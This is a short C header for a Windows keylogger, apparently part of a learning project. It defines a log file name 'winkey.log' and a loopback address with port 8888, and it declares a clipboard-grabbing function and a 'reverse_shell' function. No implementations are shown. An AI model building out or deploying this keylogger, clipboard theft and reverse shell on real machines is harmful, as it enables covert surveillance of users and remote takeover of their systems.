#ifndef KEYLOGGER_H
# define KEYLOGGER_H

// https://learn.microsoft.com/it-it/cpp/error-messages/compiler-warnings/c5045?view=msvc-170
# pragma warning(disable : 5045)

# pragma warning(disable : 4113)
# pragma warning(disable : 4133)
# pragma warning(disable : 4820)
# pragma warning(disable : 4996)

// https://social.msdn.microsoft.com/Forums/en-US/01354cd0-f0bc-40b3-a024-4e96643fc8b8/uwpc14393-warning-c4668-win32winntwin10th2-is-not-defined-as-a-preprocessor-macro?forum=wpdevelop
# define WIN32_LEAN_AND_MEAN

# include <stdio.h>
# include <signal.h>
# include <windows.h>
# include <winuser.h>
# include <winsock2.h>

# define LOGNAME "winkey.log"

# define IPADDR "127.0.0.1"
# define PORT 8888

void			get_clipboard(void);
void CALLBACK	reverse_shell(void);

#endif
